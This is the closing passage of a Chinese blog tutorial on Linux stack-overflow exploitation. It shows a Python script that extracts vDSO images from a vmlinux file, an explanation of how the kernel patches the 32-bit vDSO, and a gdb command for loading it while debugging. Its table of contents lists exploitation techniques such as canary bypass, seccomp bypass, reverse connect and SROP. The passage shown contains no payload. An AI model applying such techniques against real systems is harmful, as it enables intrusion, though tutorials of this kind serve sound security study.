Wrote %d bytes to %s&quot;</span> % (<span class="built_in">len</span>(vdso_bytes), out_path))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">2</span> &lt;= <span class="built_in">len</span>(sys.argv) &lt;= <span class="number">3</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: %s vmlinux [out_dir]&quot;</span> % sys.argv[<span class="number">0</span>], file=sys.stderr)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    vmlinux_path = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">3</span>:</span><br><span class="line">        out_dir = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        out_dir = <span class="string">&quot;.&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(out_dir):</span><br><span class="line">        os.makedirs(out_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> os.path.isdir(out_dir):</span><br><span class="line">        fatal(<span class="string">&quot;%s exists and is not a directory&quot;</span> % out_dir)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(vmlinux_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析 ELF</span></span><br><span class="line">    hdr       = parse_elf_header(data)</span><br><span class="line">    phdrs     = parse_program_headers(data, hdr)</span><br><span class="line">    sections  = parse_section_headers(data, hdr)</span><br><span class="line">    syms      = load_symbol_values(data, hdr, sections)</span><br><span class="line">    vaddr2off = make_vaddr_to_offset(phdrs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> syms:</span><br><span class="line">        fatal(<span class="string">&quot;No symbols found (file is probably stripped)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对应输出文件名：</span></span><br><span class="line">    <span class="comment">#   vdso64  -&gt; vdso64.bin</span></span><br><span class="line">    <span class="comment">#   vdso32  -&gt; vdso32.bin</span></span><br><span class="line">    <span class="comment">#   vdsox32 -&gt; vdsox32.bin</span></span><br><span class="line">    VDSO_SYMBOL_CANDIDATES = &#123;</span><br><span class="line">        <span class="string">&quot;vdso64&quot;</span>: [<span class="string">&quot;vdso_image_64&quot;</span>,  <span class="string">&quot;vdso_image_64_default&quot;</span>],</span><br><span class="line">        <span class="string">&quot;vdso32&quot;</span>: [<span class="string">&quot;vdso_image_32&quot;</span>,  <span class="string">&quot;vdso_image_32_default&quot;</span>],</span><br><span class="line">        <span class="string">&quot;vdsox32&quot;</span>: [<span class="string">&quot;vdso_image_x32&quot;</span>, <span class="string">&quot;vdso_image_x32_default&quot;</span>],</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    selected = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> label, names <span class="keyword">in</span> VDSO_SYMBOL_CANDIDATES.items():</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">            <span class="keyword">if</span> name <span class="keyword">in</span> syms:</span><br><span class="line">                selected[label] = (name, syms[name])</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> selected:</span><br><span class="line">        looked_for = [n <span class="keyword">for</span> names <span class="keyword">in</span> VDSO_SYMBOL_CANDIDATES.values() <span class="keyword">for</span> n <span class="keyword">in</span> names]</span><br><span class="line">        fatal(<span class="string">&quot;Could not find any vdso_image_* symbols in vmlinux (looked for: %s)&quot;</span> %</span><br><span class="line">              <span class="string">&quot;, &quot;</span>.join(looked_for))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Found vDSO symbols:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> label, (name, addr) <span class="keyword">in</span> selected.items():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;    %s: %s @ %#x&quot;</span> % (label, name, addr))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> label, (name, addr) <span class="keyword">in</span> selected.items():</span><br><span class="line">        extract_vdso_for_symbol(data, hdr, vaddr2off, name, addr, label, out_dir)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>VDSO 原始镜像里，给某些敏感位置留了一段 NOP + 慢路径（这里是 <code>int 0x80</code>）。在 VDSO 的尾部你也能看到 <code>.altinstructions</code> 的描述表，那些表项描述了：</p>
<ul>
<li>哪个偏移是「原始指令」；</li>
<li>替换成哪段「替代指令」；</li>
<li>在什么 CPU feature 条件下打补丁。</li>
</ul>
<p>内核在启动 &#x2F; 或者加载 VDSO 镜像时，会根据 CPU 支持情况，把那几条 NOP 替换成真正的 fast path（比如 <code>sysenter</code> &#x2F; <code>syscall</code>），但保留 <code>int 0x80</code> 做降级。</p>
<p>例如文件 offset 0x570：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000570  51 52 55 90  90 90 90 cd  80 5d 5a 59  c3 cc 90 90</span><br></pre></td></tr></table></figure></div>

<p>对应内存 0xf7ffc570：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xf7ffc570 &lt;__kernel_vsyscall&gt;:</span><br><span class="line">  0x51 0x52 0x55 0x89 0xcd 0x0f 0x05 0xcd</span><br><span class="line">0xf7ffc578:</span><br><span class="line">  0x80 0x5d 0x5a 0x59 0xc3 0xcc 0x90 0x90</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>文件里的指令序列（反汇编）大概是：</p>
  <div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">51</span>              <span class="keyword">push</span>   %ecx</span><br><span class="line"><span class="number">52</span>              <span class="keyword">push</span>   %edx</span><br><span class="line"><span class="number">55</span>              <span class="keyword">push</span>   %ebp</span><br><span class="line"><span class="number">90</span>              <span class="keyword">nop</span></span><br><span class="line"><span class="number">90</span>              <span class="keyword">nop</span></span><br><span class="line"><span class="number">90</span>              <span class="keyword">nop</span></span><br><span class="line"><span class="number">90</span>              <span class="keyword">nop</span></span><br><span class="line">cd <span class="number">80</span>           <span class="keyword">int</span>    <span class="number">$0</span>x80</span><br><span class="line"><span class="number">5d</span>              <span class="keyword">pop</span>    %ebp</span><br><span class="line">5a              <span class="keyword">pop</span>    %edx</span><br><span class="line"><span class="number">59</span>              <span class="keyword">pop</span>    %ecx</span><br><span class="line">c3              <span class="keyword">ret</span></span><br><span class="line">cc              <span class="keyword">int3</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span>           <span class="keyword">nop</span><span class="comment">; nop</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>运行时（gdb 看到）的反汇编：</p>
  <div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">51</span>              <span class="keyword">push</span>   %ecx</span><br><span class="line"><span class="number">52</span>              <span class="keyword">push</span>   %edx</span><br><span class="line"><span class="number">55</span>              <span class="keyword">push</span>   %ebp</span><br><span class="line"><span class="number">89</span> cd           <span class="keyword">mov</span>    %ecx, %ebp</span><br><span class="line">0f <span class="number">05</span>           <span class="keyword">syscall</span>       <span class="comment">; 或者某种 fast path</span></span><br><span class="line">cd <span class="number">80</span>           <span class="keyword">int</span>    <span class="number">$0</span>x80  <span class="comment">; 作为 fallback</span></span><br><span class="line"><span class="number">5d</span>              <span class="keyword">pop</span>    %ebp</span><br><span class="line">5a              <span class="keyword">pop</span>    %edx</span><br><span class="line"><span class="number">59</span>              <span class="keyword">pop</span>    %ecx</span><br><span class="line">c3              <span class="keyword">ret</span></span><br><span class="line">cc              <span class="keyword">int3</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span>           <span class="keyword">nop</span><span class="comment">; nop</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>也就是说：</p>
<ul>
<li>文件里这几个字节是：<code>90 90 90 90 cd 80</code>（纯 NOP + <code>int 0x80</code>）</li>
<li>运行时被内核改成了：<code>89 cd 0f 05 cd 80</code>（<code>mov ebp, ecx</code> + <code>syscall</code> + <code>int 0x80</code>）</li>
</ul>

    </div>
  </div>

<p>为了能在本地调试，我们可以用 gdb 的 <code>restore</code> 指令，把题目的 <code>vdso32.bin</code> 写进 VDSO 映射：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) restore vdso32.bin binary 0xf7ffc000</span><br></pre></td></tr></table></figure></div>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> linux 栈溢出</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2024-11-08 03:10:56</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-12-03 00:21:29
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2024/11/08/linux 栈溢出/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/linux-user-pwn/">#linux user pwn</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2024/11/08/linux-format-string-exploit/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">linux 格式化字符串利用</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2024/11/08/linux-IO_FILE-exploit/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">linux IO_FILE 利用</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">linux 栈溢出</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="nav-text">逻辑漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2text"><span class="nav-text">ret2text</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2syscall"><span class="nav-text">ret2syscall</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A"><span class="nav-text">系统调用约定</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%90%9C%E7%B4%A2-gadget"><span class="nav-text">搜索 gadget</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8-rop-%E9%93%BE"><span class="nav-text">常用 rop 链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#32%E4%BD%8D"><span class="nav-text">32位</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#64%E4%BD%8D"><span class="nav-text">64位</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2shellcode"><span class="nav-text">ret2shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NX-%E7%BB%95%E8%BF%87"><span class="nav-text">NX 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#32-%E4%BD%8D"><span class="nav-text">32 位</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#64-%E4%BD%8D"><span class="nav-text">64 位</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode-%E8%B0%83%E8%AF%95"><span class="nav-text">shellcode 调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8-shellcode"><span class="nav-text">常用 shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C-sh"><span class="nav-text">执行 sh</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode-%E7%BB%95%E8%BF%87"><span class="nav-text">shellcode 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%95%BF%E5%BA%A6%E5%88%A4%E6%96%AD%E7%BB%95%E8%BF%87"><span class="nav-text">长度判断绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0-%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87"><span class="nav-text">0 截断绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="nav-text">可见字符绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2libc"><span class="nav-text">ret2libc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6"><span class="nav-text">linux延迟绑定机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-text">利用过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="nav-text">泄露函数地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96libc%E5%9F%BA%E5%9D%80"><span class="nav-text">获取libc基址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0rop%E8%8E%B7%E5%8F%96shell"><span class="nav-text">构造rop获取shell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#canary-%E7%BB%95%E8%BF%87"><span class="nav-text">canary 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2canary"><span class="nav-text">泄露canary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%90%E5%AD%97%E8%8A%82%E7%88%86%E7%A0%B4"><span class="nav-text">逐字节爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81-stack-chk-failed-%E5%87%BD%E6%95%B0"><span class="nav-text">劫持 __stack_chk_failed 函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-stack-chk-failed-%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%95%B0%E6%8D%AE"><span class="nav-text">利用 __stack_chk_failed 函数报错信息泄露数据</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A6%86%E7%9B%96-canary-%E5%88%9D%E5%A7%8B%E5%80%BC"><span class="nav-text">覆盖 canary 初始值</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87"><span class="nav-text">沙箱绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-text">基本概念</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-prctl-%E5%88%9B%E5%BB%BA-seccomp"><span class="nav-text">使用 prctl 创建 seccomp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-seccomp-%E5%88%9B%E5%BB%BA-seccomp"><span class="nav-text">使用 seccomp 创建 seccomp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#open-read-write"><span class="nav-text">open-read-write</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#64-%E4%BD%8D%E7%89%88%E6%9C%AC"><span class="nav-text">64 位版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#32-%E4%BD%8D%E7%89%88%E6%9C%AC"><span class="nav-text">32 位版本</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%9B%BF%E4%BB%A3"><span class="nav-text">系统调用替代</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#open-%E6%9B%BF%E4%BB%A3%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-text">open 替代系统调用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#openat"><span class="nav-text">openat</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#openat2"><span class="nav-text">openat2</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#read-write-%E6%9B%BF%E4%BB%A3%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-text">read &#x2F; write 替代系统调用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#sendfile"><span class="nav-text">sendfile</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%BB%E5%8A%A8%E5%9B%9E%E8%BF%9E"><span class="nav-text">主动回连</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#execve-%E6%9B%BF%E4%BB%A3%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-text">execve 替代系统调用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#execveat"><span class="nav-text">execveat</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#32-%E4%BD%8D%E7%BB%95%E8%BF%87"><span class="nav-text">32 位绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-x32-%E6%A8%A1%E5%BC%8F%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-text">使用 x32 模式系统调用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%87%E6%8D%A2%E5%88%B0-i386-%E6%A8%A1%E5%BC%8F"><span class="nav-text">切换到 i386 模式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8-i386-%E6%A8%A1%E5%BC%8F%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-text">直接使用 i386 模式系统调用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-shellcode-%E4%BE%A7%E4%BF%A1%E9%81%93%E7%88%86%E7%A0%B4-flag"><span class="nav-text">使用 shellcode 侧信道爆破 flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-close-%E7%BB%95%E8%BF%87-fd-%E5%8F%82%E6%95%B0%E6%A3%80%E6%9F%A5"><span class="nav-text">使用 close 绕过 fd 参数检查</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="nav-text">栈迁移</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E5%88%B0%E6%95%B0%E6%8D%AE%E5%A1%AB%E5%85%85%E6%AE%B5"><span class="nav-text">栈迁移到数据填充段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E5%88%B0%E5%85%B6%E5%AE%83%E7%A9%BA%E9%97%B2%E5%9C%B0%E5%9D%80"><span class="nav-text">栈迁移到其它空闲地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B8%E5%AF%B9%E5%9C%B0%E5%9D%80%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="nav-text">相对地址栈迁移</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2csu"><span class="nav-text">ret2csu</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2dlresolve"><span class="nav-text">ret2dlresolve</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E7%BB%93%E6%9E%84"><span class="nav-text">相关结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Dyn"><span class="nav-text">Dyn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sym"><span class="nav-text">Sym</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Rel"><span class="nav-text">Rel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#link-map"><span class="nav-text">link_map</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dl-runtime-resolve-%E5%87%BD%E6%95%B0"><span class="nav-text">_dl_runtime_resolve 函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#32-%E4%BD%8D-ret2dlresolve"><span class="nav-text">32 位 ret2dlresolve</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B9%E5%86%99-dynamic-%E7%9A%84-DT-STRTAB"><span class="nav-text">改写 .dynamic 的 DT_STRTAB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%93%8D%E7%BA%B5%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E4%BD%BF%E5%85%B6%E6%8C%87%E5%90%91%E6%88%91%E4%BB%AC%E6%89%80%E6%9E%84%E9%80%A0%E7%9A%84-Elf32-Rel"><span class="nav-text">操纵第二个参数，使其指向我们所构造的 Elf32_Rel</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#64-%E4%BD%8D-ret2dlresolve"><span class="nav-text">64 位 ret2dlresolve</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SROP"><span class="nav-text">SROP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sigreturn-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-text">sigreturn 系统调用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#32-%E4%BD%8D%E7%9A%84-SROP"><span class="nav-text">32 位的 SROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sigreturn%EF%BC%88119%EF%BC%89%E2%80%94%E2%80%94%E8%80%81%E6%8E%A5%E5%8F%A3%E7%9A%84-frame-%E6%A0%BC%E5%BC%8F"><span class="nav-text">sigreturn（119）——老接口的 frame 格式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B0%81%E4%BC%9A%E8%B0%83%E7%94%A8-sigreturn"><span class="nav-text">谁会调用 sigreturn</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sigreturn-%E7%9A%84%E6%A0%88%E5%B8%83%E5%B1%80%EF%BC%8832-%E4%BD%8D%EF%BC%89"><span class="nav-text">sigreturn 的栈布局（32 位）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sigreturn-%E7%9A%84%E6%81%A2%E5%A4%8D%E8%BF%87%E7%A8%8B%EF%BC%88%E9%80%BB%E8%BE%91%EF%BC%89"><span class="nav-text">sigreturn 的恢复过程（逻辑）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%A8%E4%B8%8D%E5%90%8C%E5%86%85%E6%A0%B8%E4%B8%8A%E7%9A%84-CS-SS-%E9%BB%98%E8%AE%A4%E5%80%BC"><span class="nav-text">在不同内核上的 CS&#x2F;SS 默认值</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rt-sigreturn%EF%BC%88173%EF%BC%89%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E4%BF%A1%E5%8F%B7%E6%8E%A5%E5%8F%A3"><span class="nav-text">rt_sigreturn（173）——实时信号接口</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E6%9C%89-rt-sigreturn"><span class="nav-text">为什么会有 rt_sigreturn</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#rt-sigreturn-%E7%9A%84%E6%A0%88%E5%B8%83%E5%B1%80%EF%BC%8832-%E4%BD%8D%EF%BC%89"><span class="nav-text">rt_sigreturn 的栈布局（32 位）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E5%A4%84%E7%90%86-rt-sigreturn-%E7%9A%84%E6%B5%81%E7%A8%8B%EF%BC%88%E6%A6%82%E5%BF%B5%EF%BC%89"><span class="nav-text">内核处理 rt_sigreturn 的流程（概念）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%B9-SROP-%E5%88%A9%E7%94%A8%E7%9A%84%E6%84%8F%E4%B9%89"><span class="nav-text">对 SROP 利用的意义</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#64-%E4%BD%8D%E7%9A%84-SROP"><span class="nav-text">64 位的 SROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#64-%E4%BD%8D%E4%BF%A1%E5%8F%B7%E6%A0%88%E5%B8%A7%E7%BB%93%E6%9E%84"><span class="nav-text">64 位信号栈帧结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 